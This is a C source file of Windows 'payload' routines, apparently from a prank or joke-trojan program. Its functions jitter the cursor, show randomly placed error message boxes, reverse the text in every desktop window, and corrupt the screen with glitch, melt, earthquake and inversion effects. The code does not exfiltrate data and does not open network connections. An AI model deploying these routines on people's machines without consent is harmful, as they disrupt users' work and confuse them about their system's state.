#include "Payloads.h"
#include "Utils.h"
#include "GDI.h"
#include "Errors.h"

#pragma region Message Box Payload
PAYLOAD payloadMessageBox(LPWSTR text, LPWSTR label, int style, int mode) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());

	if (mode == 1) {
		LPWSTR msg = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 8192*sizeof(WCHAR));

		while (msg[0] == 0) {
			FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL,
				errorIds[random() % ERROR_COUNT], MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), msg, 8192, NULL);
		}

		MessageBoxW(NULL, msg, label, style);
		LocalFree(msg);
	} else {
		MessageBoxW(NULL, text, label, style);
	}

	UnhookWindowsHookEx(hook);
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
			int y = random() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}
#pragma endregion

#pragma region Reverse Text Payload
PAYLOAD payloadReverseText() {
	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		strReverseW(str);
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}

	GlobalFree(str);

	return TRUE;
}
#pragma endregion

#pragma region Sound Payload
const unsigned long sounds[] = {
	SND_ALIAS_SYSTEMHAND,
	SND_ALIAS_SYSTEMEXCLAMATION,
	SND_ALIAS_SYSTEMASTERISK,
	SND_ALIAS_SYSTEMQUESTION,
	SND_ALIAS_SYSTEMSTART,
	SND_ALIAS_SYSTEMEXIT
};

PAYLOAD payloadSound(int sound) {
	PlaySoundA((LPCSTR)sounds[sound], GetModuleHandle(NULL), SND_ASYNC | SND_ALIAS_ID);
}
#pragma endregion

PAYLOAD payloadGlitch(int maxSize, int power) {
	InitHDCs

	if (maxSize >= w) maxSize = w - 1;
	if (maxSize >= h) maxSize = h - 1;

	HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
	HDC hdc2 = CreateCompatibleDC(hdc);
	SelectObject(hdc2, screenshot);

	BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

	for (int i = 0; i < power; i++) {
		int width = random() % maxSize + 1;
		int height = random() % maxSize + 1;

		int x1 = random() % (w - width);
		int y1 = random() % (h - height);
		int x2 = random() % (w - width);
		int y2 = random() % (h - height);

		BitBlt(hdc2, x1, y1, width, height, hdc2, x2, y2, SRCCOPY);
	}

	BitBlt(hdc, 0, 0, w, h, hdc2, 0, 0, SRCCOPY);

	DeleteDC(hdc2);
	DeleteObject(screenshot);

	FreeHDCs
}

PAYLOAD payloadTunnel(int scale) {
	InitHDCs

	if (scale >= w/2) scale = w/2 - 1;
	if (scale >= h/2) scale = h/2 - 1;

	StretchBlt(hdc, scale, scale, rekt.right - scale*2, rekt.bottom - scale*2, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
	FreeHDCs
}

PAYLOAD payloadTrain(int xPower, int yPower) {
	InitHDCs

	if (xPower >= w) xPower = w - 1;
	if (yPower >= h) yPower = h - 1;

	HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
	HDC hdc2 = CreateCompatibleDC(hdc);
	SelectObject(hdc2, screenshot);

	// Take screenshot
	BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

	// Move screen
	BitBlt(hdc, xPower > 0 ? xPower : 0, yPower > 0 ? yPower : 0, w-abs(xPower), h-abs(yPower), hdc, xPower < 0 ? -xPower : 0, yPower < 0 ? -yPower : 0, SRCCOPY);

	// Restore overlapping part
	BitBlt(hdc, xPower < 0 ? w + xPower : 0, 0, abs(xPower), h, hdc2, xPower > 0 ? w - xPower : 0, 0, SRCCOPY);
	BitBlt(hdc, 0, yPower < 0 ? h + yPower : 0, w, abs(yPower), hdc2, 0, yPower > 0 ? h - yPower : 0, SRCCOPY);

	DeleteDC(hdc2);
	DeleteObject(screenshot);

	FreeHDCs
}

PAYLOAD payloadDrawErrors(int count, int chance) {
	InitHDCs

	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;

	POINT cursor;
	GetCursorPos(&cursor);

	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

	for (int i = 0; i < count; i++) {
		if ((random() % 100) < chance)
			DrawIcon(hdc, random() % (w-ix), random() % (h-iy), LoadIcon(NULL, IDI_WARNING));
	}

	FreeHDCs
}

PAYLOAD payloadInvertScreen() {
	InitHDCs
	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
	FreeHDCs
}

PAYLOAD payloadCursor(int power) {
	POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (power)), cursor.y + (random() % 3 - 1) * (random() % (power)));
}

#pragma region Clear Windows Action
ACTION clearWindows() {
	EnumWindows(&CleanWindowsProc, NULL);
}

BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam) {
	DWORD pid;
	if (GetWindowThreadProcessId(hwnd, &pid) && pid == GetCurrentProcessId()) {
		SendMessage(hwnd, WM_CLOSE, 0, 0);
	}
	return TRUE;
}
#pragma endregion

PAYLOAD payloadEarthquake(int delay, int power) {
	InitHDCs

	if (power >= w) power = w - 1;
	if (power >= h) power = h - 1;

	HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
	HDC hdc2 = CreateCompatibleDC(hdc);
	SelectObject(hdc2, screenshot);

	BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	BitBlt(hdc, 0, 0, w, h, hdc2, (random() % power) - (power / 2), (random() % power) - (power / 2), SRCCOPY);
	Sleep(delay * 10);
	BitBlt(hdc, 0, 0, w, h, hdc2, 0, 0, SRCCOPY);

	DeleteDC(hdc2);
	DeleteObject(screenshot);

	FreeHDCs
}

PAYLOAD payloadMeltingScreen(int xSize, int ySize, int power, int distance) {
	InitHDCs

	if (xSize >= w) xSize = w - 1;
	if (ySize >= h) ySize = h - 1;

	HBITMAP screenshot = CreateCompatibleBitmap(hdc, xSize, rekt.bottom);
	HDC hdc2 = CreateCompatibleDC(hdc);
	SelectObject(hdc2, screenshot);

	for (int i = 0; i < power; i++) {
		int x = random() % w - xSize/2;
		for (; x % distance != 0; x++) {}

		BitBlt(hdc2, 0, 0, xSize, h, hdc, x, 0, SRCCOPY);

		for (int j = 0; j < xSize; j++) {
			int depth = sin(j / ((float)xSize)*3.14159)*(ySize);
			StretchBlt(hdc2, j, 0, 1, depth, hdc2, j, 0, 1, 1, SRCCOPY);
			BitBlt(hdc2, j, 0, 1, h, hdc2, j, -depth, SRCCOPY);
		}

		BitBlt(hdc, x, 0, xSize, h, hdc2, 0, 0, SRCCOPY);
	}

	DeleteDC(hdc2);
	DeleteObject(screenshot);

	FreeHDCs
}

PAYLOAD payloadDrawPixels(DWORD color, int power) {
	InitHDCs

	HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
	HDC hdc2 = CreateCompatibleDC(hdc);
	SelectObject(hdc2, screenshot);

	BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

	for (int i = 0; i < power; i++) {
		int x = random() % w;
		int y = random() % h;

		SetPixel(hdc2, x, y, color);
	}

	BitBlt(hdc, 0, 0, w, h, hdc2, 0, 0, SRCCOPY);

	DeleteDC(hdc2);
	DeleteObject(screenshot);

	FreeHDCs
}